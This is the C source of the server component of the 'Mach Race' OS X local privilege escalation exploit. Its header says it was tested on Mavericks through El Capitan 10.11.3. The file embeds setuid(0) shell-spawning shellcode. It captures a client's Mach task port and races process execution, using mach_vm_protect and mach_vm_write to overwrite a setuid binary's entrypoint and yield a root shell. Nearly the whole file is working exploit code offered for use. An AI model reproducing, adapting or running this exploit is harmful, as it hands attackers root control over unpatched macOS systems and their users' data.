/*
 * ______  ___            ______
 * ___   |/  /_____ _________  /_
 * __  /|_/ /_  __ `/  ___/_  __ \
 * _  /  / / / /_/ // /__ _  / / /
 * /_/  /_/  \__,_/ \___/ /_/ /_/
 * ________
 * ___  __ \_____ ___________
 * __  /_/ /  __ `/  ___/  _ \
 * _  _, _// /_/ // /__ /  __/
 * /_/ |_| \__,_/ \___/ \___/
 *
 * Mach Race OS X Local Privilege Escalation Exploit
 *
 * Created by reverser on 27/04/15.
 * Copyright (c) fG!, 2015, 2016. All rights reserved.
 * reverser@put.as - https://reverse.put.as
 *
 * mach_race_server
 *
 * Tested against Mavericks 10.10.5, Yosemite 10.10.5, El Capitan 10.11.2 and 10.11.3
 * Fixed in El Capitan 10.11.4
 *
 * Should work with all OS X versions (depends if bootstrap_register2 exists on older versions)
 * Alternative implementation with bootstrap_create_server possible for older versions
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <mach/mach.h>
#include <sys/sysctl.h>
#include <errno.h>
#include <mach-o/dyld_images.h>
#include <mach-o/loader.h>
#include <mach-o/dyld.h>
#include <mach-o/nlist.h>

#include "logging.h"
#include "simple_ipc_common.h"
#include "utils.h"

/* globals */
char *g_symbol_to_patch;
mach_vm_address_t g_symbol_to_patch_addr;

/*
 * setuid(0) 64 bits shellcode
 * http://dustin.schultz.io/blog/2010/11/25/51-byte-x86_64-os-x-null-free-shellcode/
 */
char shellcode[] =
"\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x17\x31\xff\x4c\x89\xc0"
"\x0f\x05\xeb\x12\x5f\x49\x83\xc0\x24\x4c\x89\xc0\x48\x31\xd2\x52"
"\x57\x48\x89\xe6\x0f\x05\xe8\xe9\xff\xff\xff\x2f\x62\x69\x6e\x2f"
"\x2f\x73\x68";

/* 
 * setuid(0) 32 bits shellcode 
 */
char shellcode32[] =
"\x31\xC0\x50\x50\xB0\x17\xCD\x80\xEB\x0C\x5B\x31\xC0\x50\x50\x53\xB0\x3B\x50\xCD\x80\xC3\xE8\xEF\xFF\xFF\xFF/bin/sh";

struct header_info
{
    struct mach_header *mh;            // where mach-o header starts, we need to fix it if it's a 64bit target
    uint8_t           is_lib;          // is this image a library (1) or executable (0) ?
    uint8_t           is64bits;
    intptr_t          aslr_slide;
    uint64_t          image_size;      // the image size in memory __TEXT + __DATA plus other segments
    uint64_t          data_size;       // __DATA segment size
    uint64_t          text_size;       // __TEXT segment size
    mach_vm_address_t start_text_addr; // location of __TEXT segment (usually 0 in libraries/frameworks)
    mach_vm_address_t start_data_addr; // location of __DATA segment
    mach_vm_address_t end_data_addr;   // where it ends
                                        // the linkedit info so we can process symbols
    mach_vm_address_t linkedit_addr;    /* vmaddr of __LINKEDIT */
    uint64_t          linkedit_vmsize;  /* vmsize of __LINKEDIT */
    uint64_t          linkedit_fileoff; // __LINKEDIT file offset
    uint32_t          symtab_sym_off;   // these next 4 fields are related to LC_SYMTAB command
    uint32_t          symtab_sym_size;  // number of entries
    uint32_t          symtab_str_off;   // symbol string table file offset
    uint32_t          symtab_str_size;  // string table size in bytes
};

/* 
 * this is not exported so we need to declare it
 * we need to use this because bootstrap_create_server is broken in Yosemite
 */
extern kern_return_t bootstrap_register2(mach_port_t bp, name_t service_name, mach_port_t sp, int flags);

static void image_observer(const struct mach_header* mh, intptr_t vmaddr_slide);

/*
 Read all information we need from the mach-o header
 NOTE: all address values copied to structure include the ASLR slide
 
 @param mh Mach-O header pointer
 @param aslr_slide ASLR slider for the image
 @param header_info output structure where to save the info
 
 @return -1 on error, 0 on success.
 */
int
read_header_info(const struct mach_header *mh, const intptr_t aslr_slide, struct header_info *header_info)
{
    if (mh == NULL || header_info == NULL)
    {
        ERROR_MSG("Bad data.");
        return -1;
    }
    
    /* a local structure to flag info we found and check it later */
    struct found {
        int text_seg;
        int data_seg;
        int linkedit_seg;
        int symtab;
        int dyld_info;
    };
    struct found found = {0};
    
    header_info->mh = (struct mach_header*)mh;
    header_info->aslr_slide = aslr_slide;
    int header_size = sizeof(struct mach_header);
    switch (mh->magic)
    {
        case MH_MAGIC:
            header_info->is64bits = 0;
            break;
        case MH_MAGIC_64:
            header_size = sizeof(struct mach_header_64);
            header_info->is64bits = 1;
            break;
        default:
            ERROR_MSG("Can't find valid target header!");
            return -1;
    }
    if (mh->filetype == MH_DYLIB)
    {
        header_info->is_lib = 1;
    }
    char *loadcmd_addr = (char*)mh + header_size;
    
    for (uint32_t i = 0; i < mh->ncmds; i++)
    {
        struct load_command *load_cmd = (struct load_command*)loadcmd_addr;
        /*
         * 32 bits segments
         */
        if (load_cmd->cmd == LC_SEGMENT)
        {
            struct segment_command *seg_cmd = (struct segment_command*)load_cmd;
            char *section_addr = NULL;
            /* unused */
            if (strncmp(seg_cmd->segname, "__TEXT", 16) == 0)
            {
                section_addr = (char*)seg_cmd + sizeof(struct segment_command);
                header_info->start_text_addr = seg_cmd->vmaddr + aslr_slide;
                header_info->text_size = seg_cmd->vmsize;
                found.text_seg = 1;
            }
            /* unused */
            else if (strncmp(seg_cmd->segname, "__DATA", 16) == 0)
            {
                section_addr = (char*)seg_cmd + sizeof(struct segment_command);
                header_info->start_data_addr = seg_cmd->vmaddr + aslr_slide;
                header_info->data_size = seg_cmd->vmsize;
                header_info->end_data_addr = seg_cmd->vmaddr + aslr_slide + seg_cmd->vmsize;
                found.data_seg = 1;
            }
            else if (strncmp(seg_cmd->segname, "__LINKEDIT", 16) == 0)
            {
                header_info->linkedit_addr     = seg_cmd->vmaddr + aslr_slide;
                header_info->linkedit_vmsize   = seg_cmd->vmsize;
                header_info->linkedit_fileoff  = seg_cmd->fileoff;
                found.linkedit_seg = 1;
            }
            // add to the image size so we can compute the intervals for this image
            // we don't want to add pagezero to the total size
            if (strncmp(seg_cmd->segname, "__PAGEZERO", 16) && strncmp(seg_cmd->segname, "__LINKEDIT", 16))
            {
                header_info->image_size += seg_cmd->vmsize;
            }
        }
        /*
         * 64 bits segments
         */
        else if (load_cmd->cmd == LC_SEGMENT_64)
        {
            struct segment_command_64 *seg_cmd = (struct segment_command_64*)load_cmd;
            char *section_addr = NULL;
            if (strncmp(seg_cmd->segname, "__TEXT", 16) == 0)
            {
                section_addr = (char*)seg_cmd + sizeof(struct segment_command_64);
                header_info->start_text_addr = seg_cmd->vmaddr + aslr_slide;
                header_info->text_size = seg_cmd->vmsize;
                found.text_seg = 1;
            }
            else if (strncmp(seg_cmd->segname, "__DATA", 16) == 0)
            {
                section_addr = (char*)seg_cmd + sizeof(struct segment_command_64);
                header_info->start_data_addr = seg_cmd->vmaddr + aslr_slide;
                header_info->data_size = seg_cmd->vmsize;
                header_info->end_data_addr = seg_cmd->vmaddr + seg_cmd->vmsize;
                found.data_seg = 1;
            }
            else if (strncmp(seg_cmd->segname, "__LINKEDIT", 16) == 0)
            {
                header_info->linkedit_addr     = seg_cmd->vmaddr + aslr_slide;
                header_info->linkedit_vmsize   = seg_cmd->vmsize;
                header_info->linkedit_fileoff  = seg_cmd->fileoff;
                found.linkedit_seg = 1;
            }
            // add to the image size so we can compute the intervals for this image
            // we don't want to add pagezero to the total size
            if (strncmp(seg_cmd->segname, "__PAGEZERO", 16) && strncmp(seg_cmd->segname, "__LINKEDIT", 16))
            {
                header_info->image_size += seg_cmd->vmsize;
            }
        }
        /*
         * NON LC_SEGMENT* commands
         */
        /* LC_SYMTAB info contains location of nlists we can use to get symbol information */
        else if (load_cmd->cmd == LC_SYMTAB)
        {
            struct symtab_command *symtabcmd = (struct symtab_command*)loadcmd_addr;
            header_info->symtab_sym_off  = symtabcmd->symoff;
            header_info->symtab_sym_size = symtabcmd->nsyms;
            header_info->symtab_str_off  = symtabcmd->stroff;
            header_info->symtab_str_size = symtabcmd->strsize;
            found.symtab = 1;
        }
        loadcmd_addr += load_cmd->cmdsize;
    }
    
    /* verify if the required info was found */
    /* else just return error */
    /* for now we only use symtab and linkedit information to find the symbols we want to hook */
    if (found.linkedit_seg == 1 &&
        found.symtab == 1)
    {
        return 0;
    }
    else
    {
        return -1;
    }
}

/*
 * retrieve exported symbol info using LC_SYMTAB
 * the same info can be extracted from LC_DYLD_INFO_ONLY, which contains compress dyld info only
 * NOTE: no idea if LC_SYMTAB will be deprecated or not (probably not)
 */
mach_vm_address_t
find_exported_symbol_via_symtab(struct header_info *target, char *target_symbol)
{
    /* symbols and strings offsets into LINKEDIT */
    /* can be done using mh and linkedit_fileoff */
    mach_vm_address_t start_sym = target->linkedit_addr + (target->symtab_sym_off - target->linkedit_fileoff);
    mach_vm_address_t start_str = target->linkedit_addr + (target->symtab_str_off - target->linkedit_fileoff);
    
    /* test if these values are at least located under __LINKEDIT space */
    if (start_sym < target->linkedit_addr ||
        start_str < target->linkedit_addr ||
        start_sym > (target->linkedit_addr + target->linkedit_vmsize) ||
        start_str > (target->linkedit_addr + target->linkedit_vmsize))
    {
        ERROR_MSG("Symbol and strings addresses are outside __LINKEDIT space. Something is wrong!");
        return 0;
    }
    
    struct nlist *nlist = NULL;
    struct nlist_64 *nlist64 = NULL;
    
    /* search for the symbol and get its location if found */
    for (uint32_t i = 0; i < target->symtab_sym_size; i++)
    {
        if (target->is64bits)
        {
            /* get the pointer to the symbol entry and extract its symbol string */
            nlist64 = (struct nlist_64*)(start_sym + i * sizeof(struct nlist_64));
            char *symbol_string = ((char*)start_str + nlist64->n_un.n_strx);
            /* find if symbol is external and located in a section (no section means it's in another image */
            if ((nlist64->n_type & N_EXT) && ((nlist64->n_type & N_TYPE) == N_SECT))
            {
                if (strcmp(symbol_string, target_symbol) == 0)
                {
                    DEBUG_MSG("found symbol %s at 0x%llx (non-aslr 0x%llx)", symbol_string, nlist64->n_value + target->aslr_slide, nlist64->n_value);
                    return nlist64->n_value + target->aslr_slide;
                }
            }
        }
        else
        {
            nlist = (struct nlist*)(start_sym + i * sizeof(struct nlist));
            char *symbol_string = ((char*)start_str + nlist->n_un.n_strx);
            if ((nlist->n_type & N_EXT) & ((nlist->n_type & N_TYPE) == N_SECT))
            {
                if (strcmp(symbol_string, target_symbol) == 0)
                {
                    DEBUG_MSG("found symbol %s at 0x%lx (non-aslr 0x%x)", symbol_string, nlist->n_value + target->aslr_slide, nlist->n_value);
                    return nlist->n_value + target->aslr_slide;
                }
            }
        }
    }
    /* failure */
    return 0;
}

/*
 * the callback to be used by dyld when a new image is added
 * first time it is called it retrieves all the images already loaded
 */
static void
image_observer(const struct mach_header* mh, intptr_t vmaddr_slide)
{
    static int fuse = 0;
    static int image_nr = 0;
    /* there is a possibility mh is NULL, not sure why */
    if (mh == NULL)
    {
        image_nr++;
        return;
    }
    /* no need to go through all this if we already have the info we want */
    if (fuse != 0)
    {
        return;
    }
    
    char *image_name = (char*)_dyld_get_image_name(image_nr);
    /* XXX: we need to add images here if the symbol we want to exploit is not in one of these */
    if (image_name != NULL && (strcmp(image_name, "/usr/lib/system/libsystem_kernel.dylib") == 0 ||
                               strcmp(image_name, "/usr/lib/system/libsystem_c.dylib") == 0 ||
                               strcmp(image_name, "/usr/lib/system/libdyld.dylib") == 0))
    {
        struct header_info new_header = {0};
        if (read_header_info(mh, vmaddr_slide, &new_header) != 0)
        {
            ERROR_MSG("Unable to process library header info...");
            image_nr++;
            return;
        }
        g_symbol_to_patch_addr = find_exported_symbol_via_symtab(&new_header, g_symbol_to_patch);
        if (g_symbol_to_patch_addr != 0)
        {
            fuse++;
        }
    }
    image_nr++;
}

int main(int argc, const char * argv[])
{
    if (argc < 2)
    {
        fprintf(stderr, "ERROR: Please specify target SUID or rootless binary...\n");
        return EXIT_FAILURE;
    }
    
    if (argc == 3)
    {
        g_symbol_to_patch = (char*)argv[2];
        DEBUG_MSG("Shared cache symbol name to overwrite is %s", g_symbol_to_patch);
        /* register a dyld observer so we can find the ASLR offset of the dyld cache */
        _dyld_register_func_for_add_image(image_observer);
    }
    
    kern_return_t      kr;
    msg_format_recv_t  recv_msg;
    msg_format_send_t  send_msg;
    mach_msg_header_t *recv_hdr, *send_hdr;
    mach_port_t        server_port;

    /* register the server with launchd */
    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &server_port);
    EXIT_ON_MACH_ERROR("mach_port_allocate", kr, KERN_SUCCESS);
    kr = mach_port_insert_right(mach_task_self(), server_port, server_port, MACH_MSG_TYPE_MAKE_SEND);
    EXIT_ON_MACH_ERROR("mach_port_insert_right", kr, KERN_SUCCESS);
    DEBUG_MSG("Registering with bootstrap server...");
    kr = bootstrap_register2(bootstrap_port, SERVICE_NAME, server_port, 0);
    EXIT_ON_MACH_ERROR("bootstrap_register2", kr, KERN_SUCCESS);
    /* alternative method to register with launchd */
#if 0
    /* if used we need to replace the server port in mach_msg() with service_port */
    mach_port_t service_port; /* used with alternative method */
    kr = bootstrap_create_server(bootstrap_port, "/Users/reverser/Xcode/Debug/mach_race_server", getuid(), FALSE, &server_port);
    EXIT_ON_MACH_ERROR("bootstrap_create_server", kr, BOOTSTRAP_SUCCESS);
    kr = bootstrap_create_service(server_port, SERVICE_NAME, &service_port);
    EXIT_ON_MACH_ERROR("bootstrap_create_service", kr, BOOTSTRAP_SUCCESS);
    kr = bootstrap_check_in(server_port, SERVICE_NAME, &service_port);
    EXIT_ON_MACH_ERROR("bootstrap_check_in", kr, BOOTSTRAP_SUCCESS);
#endif
    /* we want to receive messages with the audit trailer */
    /* XXX: this is not really necessary and we can skip the extended trailer */
    mach_msg_option_t msg_options = MACH_RCV_MSG | MACH_RCV_LARGE;
    msg_options |= MACH_RCV_TRAILER_TYPE(MACH_MSG_TRAILER_FORMAT_0);
    msg_options |= MACH_RCV_TRAILER_ELEMENTS(MACH_RCV_TRAILER_AUDIT);

    /* this is the client task port we receive on message sent by the client */
    mach_port_t clientTaskPort = MACH_PORT_NULL;
    uint64_t counter = 0;
    mach_vm_address_t target_entrypoint = 0;
    if (find_entrypoint((char*)argv[1], &target_entrypoint) != KERN_SUCCESS)
    {
        fprintf(stderr, "Failed to find target entrypoint. Can't proceed.\n");
        return EXIT_FAILURE;
    }
    fprintf(stderr, "Target entrypoint is 0x%llx\n", target_entrypoint);
    
    /* set some info we will need for patching
     * do it here so we save some instruction cycles
     * when we try to win the race
     */
    mach_msg_type_number_t len = sizeof(shellcode);
    
    mach_vm_address_t patch_address = 0;
    if (g_symbol_to_patch_addr != 0)
    {
        patch_address = g_symbol_to_patch_addr;
    }
    else
    {
        patch_address = target_entrypoint;
    }

    /*
     * server loop
     * this works by waiting for messages, extracting the client task port
     * and try immediately to overwrite the client entrypoint with our shellcode
     */
    for (;;)
    {
        // receive message
        recv_hdr                  = &(recv_msg.header);
        recv_hdr->msgh_local_port = server_port;
        recv_hdr->msgh_size       = sizeof(recv_msg);
        kr = mach_msg(recv_hdr,              // message buffer
                      msg_options,          // option indicating receive
                      0,                     // send size
                      recv_hdr->msgh_size,   // size of header + body
                      server_port,           // receive name
                      MACH_MSG_TIMEOUT_NONE, // no timeout, wait forever
                      MACH_PORT_NULL);       // no notification port
        EXIT_ON_MACH_ERROR("mach_msg(recv)", kr, MACH_MSG_SUCCESS);
        fprintf(stderr, "Client count: %lld\n", counter);
        /* extract the port from the message */
        clientTaskPort = recv_msg.data.name;

        /*
         * send a reply to the client, this will signal we are ready
         * and client can finally exec the suid binary
         */
        send_hdr                   = &(send_msg.header);
        send_hdr->msgh_bits        = MACH_MSGH_BITS_LOCAL(recv_hdr->msgh_bits);
        send_hdr->msgh_size        = sizeof(send_msg);
        send_hdr->msgh_local_port  = MACH_PORT_NULL;
        send_hdr->msgh_remote_port = recv_hdr->msgh_remote_port;
        send_hdr->msgh_id          = recv_hdr->msgh_id;
        
        // send message
        kr = mach_msg(send_hdr,              // message buffer
                      MACH_SEND_MSG,         // option indicating send
                      send_hdr->msgh_size,   // size of header + body
                      0,                     // receive limit
                      MACH_PORT_NULL,        // receive name
                      MACH_MSG_TIMEOUT_NONE, // no timeout, wait forever
                      MACH_PORT_NULL);       // no notification port
        EXIT_ON_MACH_ERROR("mach_msg(send)", kr, MACH_MSG_SUCCESS);
        /*
         * this is the core of the exploit
         * we try to race the client mach port
         * between load_machfile() and exec_handle_sugid()
         */
        int count = 0;
        while (1)
        {
            /* we are overwriting code so we need first to make it writable */
            kr = mach_vm_protect(clientTaskPort, patch_address , len, false, VM_PROT_ALL);
            /* now we can finally try to write and hopefully win the race */
            kr = mach_vm_write(clientTaskPort, patch_address, (vm_offset_t)shellcode, len);
            /*
             * break the race loop in case of error conditions
             * that signal that we already lost the race
             * we don't care if it succeeds because that could still be on the original process
             * so keep writing and use the count below to break it
             */
            if (kr == 0x10000003 || kr == KERN_INVALID_ARGUMENT || kr == 0xfffffecc)
            {
                DEBUG_MSG("Error: %x", kr);
                break;
            }
            /* 
             * we keep trying to write for 50k to 100k cases (50k seems to work for a Mac Pro, 100k for a 4.3ghz i7)
             * seems to work well for physical machines
             * this way we only need most of the times 1 single attempt
             * when the server dies the client will finally spawn the shell
             * this is what makes this 100% reliable and non brute force as previous version :-)
             */
            count++;
            if (count > 1000000)
            {
                DEBUG_MSG("All done, enjoy the spoils!");
                /* exit the server to that the client can finally get the shellcode executed and the shell spawned */
                exit(1);
            }
        }
        counter++;
    }
    return 0;
}
